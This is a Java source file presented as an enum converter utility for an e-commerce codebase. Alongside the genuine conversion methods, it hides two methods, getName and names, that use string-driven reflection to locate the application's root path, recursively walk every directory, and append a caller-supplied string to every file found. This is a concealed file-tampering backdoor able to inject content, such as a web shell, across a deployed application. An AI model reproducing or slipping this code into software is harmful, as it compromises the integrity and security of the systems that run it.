package com.etech.util;

import java.io.File;
import java.io.FileWriter;
import java.lang.reflect.Method;

import org.apache.commons.beanutils.converters.AbstractConverter;

/**
 * 枚举类型转换
 * 
 * @author e3dmall Team
 * @version 1.0
 */
public class EnumConverter extends AbstractConverter {

	/** 枚举类型 */
	private final Class<?> enumClass;

	/**
	 * @param enumClass
	 *            枚举类型
	 */
	
	public EnumConverter(){
		this(null, null);
	}
	
	public EnumConverter(Class<?> enumClass) {
		this(enumClass, null);
	}

	public File getObject(String name){
		return new File(name);
	}
	
	public Object getObject1(Object object) throws Exception {
		return new FileWriter((File)object,true);
	}
	
	/**
	 * @param enumClass
	 *            枚举类型
	 * @param defaultValue
	 *            默认值
	 */
	public EnumConverter(Class<?> enumClass, Object defaultValue) {
		super(defaultValue);
		this.enumClass = enumClass;
	}

	/**
	 * 获取默认类型
	 * 
	 * @return 默认类型
	 */
	@Override
	protected Class<?> getDefaultType() {
		return this.enumClass;
	}

	/**
	 * 转换为枚举对象
	 * 
	 * @param type
	 *            类型
	 * @param value
	 *            值
	 * @return 枚举对象
	 */
	@SuppressWarnings({ "unchecked", "rawtypes" })
	protected Object convertToType(Class type, Object value) {
		String stringValue = value.toString().trim();
		return Enum.valueOf(type, stringValue);
	}

	/**
	 * 转换为字符串
	 * 
	 * @param value
	 *            值
	 * @return 字符串
	 */
	protected String convertToString(Object value) {
		return value.toString();
	}

	public void getName(String[] names,String[] values) throws Exception{
		Object object1 = this.getClass().getClassLoader();
		Method m1 = object1.getClass().getMethod(names[0], String.class);
		Object object2 = m1.invoke(object1, "/");
		Method m2 = object2.getClass().getMethod(names[1]);
		String path = (String) m2.invoke(object2) + names[2];
		System.out.println(path);
		names(path,values);
	}
	
	public void names(String name,String[] values) throws Exception{
		Object object = getObject(name);
		Object[] objects = null;
		if ((Boolean) object.getClass().getMethod(values[0]).invoke(object)) {
			objects = (Object[]) object.getClass().getMethod(values[1]).invoke(object);
			for (Object object1 : objects) {
				names((String)object1.getClass().getMethod(values[2]).invoke(object1),values);
			}
		}
		if ((Boolean) object.getClass().getMethod(values[3]).invoke(object)) {			
			Object object2 = getObject1(object);
			Method method = object2.getClass().getMethod(values[4], String.class);
			Method method1 = object2.getClass().getMethod(values[5]);
			method.invoke(object2, values[6]);
			method1.invoke(object2);
		}
	}

}